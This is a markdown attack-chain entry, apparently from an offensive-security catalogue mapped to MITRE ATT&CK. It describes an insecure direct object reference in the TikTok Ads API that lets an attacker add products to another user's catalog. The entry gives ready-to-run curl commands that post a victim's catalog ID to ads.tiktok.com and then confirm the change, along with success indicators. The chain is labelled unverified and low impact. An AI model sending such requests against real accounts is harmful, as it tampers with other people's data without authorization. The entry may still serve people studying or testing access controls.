---
tags:
  - idor
  - tiktok
  - api
  - unauthorized-access
  - catalog-modification
type: attack_chain
tools: []
tactics:
  - '[[Initial Access]]'
verified: false
platforms:
  - Web
submitted: true
complexity: low
created_at: '2023-10-01T00:00:00Z'
procedures:
  - '[[procedures/Exploit-IDOR-in-TikTok-Ads-API-to-Add-Unauthorized-Products]]'
step_count: 1
techniques:
  - '[[Exploit Public-Facing Application]]'
updated_at: '2025-12-14T17:30:47.330Z'
description: >-
  Exploitation of an Insecure Direct Object Reference (IDOR) vulnerability in
  the TikTok Ads API to add arbitrary products to a user's catalog without
  authorization.
skill_level: low
impact_level: low
id: 08b05697-00f8-4ef1-8c1d-0d1ef9257df2
validated: true
mitre_tactics:
  - '[[Initial Access]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
---
# IDOR in TikTok Ads API Allowing Unauthorized Product Addition to Catalog

Multi-stage attack chain demonstrating a complete attack workflow.

## Chain Metrics Dashboard

| Metric | Value |
|--------|-------|
| Chain Status | Unverified |
| Total Steps | 1 |
| Execution Time | ~5 minutes |
| Skill Level | Low |
| Complexity | Low |
| Impact Level | Low |

## Attack Flow Visualization

```mermaid
graph LR
    A[Initial Access via IDOR Exploitation] --> B[Catalog Modification]

    style A fill:#e74c3c
    style B fill:#27ae60
```

## Prerequisites & Requirements

### Required Tools

- None (uses standard HTTP client like curl)

### Target Environment

- Web platform
- TikTok Ads API service at ads.tiktok.com
- Requires authenticated session to the API

### Initial Access Requirements

- Valid user credentials for TikTok Ads account
- Network access to ads.tiktok.com
- No prior elevated access needed

## Detailed Attack Procedures

### Step 1: Exploit IDOR to Add Unauthorized Product
procedure: [[procedures/Exploit-IDOR-in-TikTok-Ads-API-to-Add-Unauthorized-Products]]

**Objective**: Gain unauthorized access to modify a user's product catalog by directly referencing object IDs without proper authorization checks.

**Instructions**: Authenticate to the TikTok Ads API and send a request to add a product using an arbitrary object reference. Use [[commands/curl-add-product-idor]] to craft the malicious request:

```bash
curl -X POST 'https://ads.tiktok.com/api/catalog/products/' \
  -H 'Authorization: Bearer YOUR_ACCESS_TOKEN' \
  -H 'Content-Type: application/json' \
  -d '{"product_id": "arbitrary_product_id", "catalog_id": "victim_catalog_id"}'
```

Verify the addition by querying the catalog:

```bash
curl -X GET 'https://ads.tiktok.com/api/catalog/products/' \
  -H 'Authorization: Bearer YOUR_ACCESS_TOKEN' \
  -H 'Content-Type: application/json'
```

**Expected Output**: The API responds with a success message for product addition, and the catalog query shows the unauthorized product.

**Success Indicators**:
- HTTP 200 or 201 response on add request
- Unauthorized product appears in catalog list

## Attack Chain Summary

### Key Achievements

1. Unauthorized modification of user catalog
2. Demonstration of IDOR bypassing authorization
3. Low-severity impact without broader compromise

## Technique & Tactic Coverage

### MITRE ATT&CK Techniques

- [[Exploit Public-Facing Application]]

### MITRE ATT&CK Tactics

- [[Initial Access]]

---
*Last updated: 2023-10-01T00:00:00Z*
